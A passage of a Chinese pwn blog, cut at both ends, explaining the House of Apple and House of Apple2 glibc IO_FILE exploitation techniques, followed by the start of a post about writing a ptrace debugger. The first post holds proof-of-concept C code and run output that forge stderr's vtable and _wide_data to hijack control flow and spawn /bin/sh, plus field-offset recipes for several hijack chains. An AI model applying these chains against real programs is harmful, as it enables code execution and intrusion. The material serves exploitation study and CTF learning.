class="keyword">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f6c95c1c420</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f6c95d855e8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f6c95d85634</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f6c95d85660</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f6c95d85698</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f6c95d80c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall <span class="keyword">and</span> trigger house of apple</span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br></pre></td></tr></table></figure>
<ul>
<li>成功对堆上的数据进行了修改</li>
</ul>
<p>上面这种用法只能实现已知地址任意写（和 largebin attack 的效果类似），下面这种利用方式可以直接劫持程序流程（称为 house of apple2）</p>
<h2 id="House-Of-Apple2-原理"><a href="#House-Of-Apple2-原理" class="headerlink" title="House Of Apple2 原理"></a>House Of Apple2 原理</h2><p><code>stdin/stdout/stderr</code> 这三个 <code>_IO_FILE</code> 结构体会以 <code>_IO_file_jumps</code> 为虚表，而其中的函数 <code>IO_validate_vtable</code> 负责检查 <code>vtable</code> 的合法性</p>
<p>但在调用虚表 <code>_wide_vtable</code> 里面的函数时，并没有检查 <code>vtable</code> 的合法性</p>
<p>因此，我们可以劫持 <code>IO_FILE</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制 <code>_wide_data</code> 为可控的堆地址空间，进而控制 <code>_wide_data-&gt;_wide_vtable</code> 为可控的堆地址空间，然后控制程序的执行流：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode -&gt; backdoor</span><br></pre></td></tr></table></figure>
<h2 id="House-Of-Apple2-利用姿势"><a href="#House-Of-Apple2-利用姿势" class="headerlink" title="House Of Apple2 利用姿势"></a>House Of Apple2 利用姿势</h2><p>使用 house of apple2 的条件为：</p>
<ul>
<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
<li>能控制程序执行<code>IO</code>操作：<ul>
<li>从 <code>main</code> 函数返回</li>
<li>调用 <code>exit</code> 函数</li>
<li>通过 <code>__malloc_assert</code> 触发</li>
</ul>
</li>
<li>能控制 <code>_IO_FILE</code> 的 <code>vtable</code> 和 <code>_wide_data</code>（一般使用 <code>largebin attack</code>去控制）</li>
</ul>
<p>使用案例如下：（使用 <code>_IO_wdefault_xsgetn</code> 调用链）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="keyword">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *stderr2 = (<span class="keyword">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="keyword">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="keyword">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="keyword">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7fe29386f420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7fe2937eb000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7fe2939d85c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7fe2939d3c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: <span class="function">call <span class="title">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span></span><br><span class="line"><span class="function">$ whoami</span></span><br><span class="line"><span class="function">yhellow</span></span><br></pre></td></tr></table></figure>
<p>下面给出几条好用的调用链及其利用方式：</p>
<p>利用 <code>_IO_wfile_overflow</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~(2 | 0x8 | 0x800)</code></li>
<li><code>vtable</code> = <code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 的地址（加减偏移）</li>
<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足 <code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_base</code> = <code>0</code>（即满足 <code>*(A+0x18)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足 <code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足 <code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足 <code>*(B+0x68)=C</code>）</li>
</ul>
<p>利用 <code>_IO_wfile_underflow_mmap</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
<li>PS：这条链执行的条件是调用到 <code>_IO_wdefault_xsgetn</code> 时 <code>RDX</code> 寄存器不能为“0”</li>
</ul>
<p>利用 <code>_IO_wdefault_xsgetn</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>0x800</code></li>
<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> = <code>0</code>（即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/05/myGDB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/05/myGDB/" class="post-title-link" itemprop="url">myGDB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-05 00:11:46 / Modified: 00:13:59" itemprop="dateCreated datePublished" datetime="2022-11-05T00:11:46+08:00">2022-11-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>简单GDB</strong></p>
<p>之前学习了 ptrace 系统调用，看了别人写的各种 demo 和简单调试器</p>
<p>我想自己尝试写一个简单的 GDB</p>
<p>目前实现的功能如下：</p>
<ul>
<li>单步执行（步入）</li>
<li>显示寄存器</li>
<li>显示内存</li>
<li>打断点</li>
<li>显示断点</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span 